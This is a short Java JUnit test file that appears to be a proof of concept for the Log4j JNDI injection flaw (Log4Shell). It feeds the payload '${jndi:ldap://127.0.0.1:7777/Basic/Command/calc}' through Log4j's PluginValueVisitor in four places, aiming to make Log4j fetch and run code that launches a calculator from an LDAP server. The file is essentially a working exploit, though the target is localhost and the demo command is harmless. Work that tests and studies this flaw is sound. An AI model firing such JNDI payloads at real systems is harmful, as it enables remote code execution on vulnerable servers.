import org.apache.logging.log4j.core.LogEvent;
import org.apache.logging.log4j.core.config.Configuration;
import org.apache.logging.log4j.core.config.DefaultConfiguration;
import org.apache.logging.log4j.core.config.Node;
import org.apache.logging.log4j.core.config.plugins.PluginValue;
import org.apache.logging.log4j.core.config.plugins.visitors.PluginValueVisitor;
import org.apache.logging.log4j.core.config.plugins.visitors.PluginVisitor;
import org.apache.logging.log4j.core.impl.MutableLogEvent;
import org.junit.jupiter.api.Test;

import java.lang.annotation.Annotation;

public class PluginPocsTests {

    @Test
    public void PluginValueVisitor() {
        Configuration configuration = new DefaultConfiguration();

        Node node = new Node();
        node.setValue("${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}");

        PluginVisitor visitor = new PluginValueVisitor();
        visitor.setStrSubstitutor(configuration.getStrSubstitutor());


        PluginValue annotation = new PluginValue(){

            @Override
            public Class<? extends Annotation> annotationType() {
                return this.getClass();
            }

            @Override
            public String value() {
                return "${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}";
            }
        };
        LogEvent logEvent = new MutableLogEvent(new StringBuilder("${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}"), null);
        visitor.setAnnotation(annotation);

        visitor.visit(configuration, node, logEvent, new StringBuilder("${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}"));
    }
}
